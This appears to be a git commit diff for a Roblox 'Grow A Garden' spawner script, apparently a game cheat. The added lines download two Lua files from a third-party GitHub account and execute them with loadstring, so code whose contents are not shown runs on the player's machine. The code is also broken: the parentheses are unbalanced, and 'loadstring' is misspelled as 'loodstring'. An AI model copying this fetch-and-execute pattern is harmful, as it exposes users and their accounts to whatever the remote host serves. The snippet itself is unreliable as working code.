4f13f3582e18191ec559dfa1d6c7eb06ca9f690a
Roblox Scripts <gregyheport@gmail.com>
2025-07-22 15:34:32 +0800

    Update GrowAGarden-Main-Null-Hub-Spawner-Script.lua

--- GrowAGarden-Main-Null-Hub-Spawner-Script.lua
+++ GrowAGarden-Main-Null-Hub-Spawner-Script.lua
@@ -1,2 +1,4 @@
 local s1 = game:HttpGet("https://raw.githubusercontent.com/Rawbr10/loader/refs/heads/main/GrowAGarden-Script2-Tesla-Main.lua"))()
-local s2 = 
+local s2 = game:HttpGet("https://raw.githubusercontent.com/Rawbr10/loader/refs/heads/main/GrowAGarden-Null-Scripts.lua"))()
+loadstring(s1)()
+loodstring(s2)()
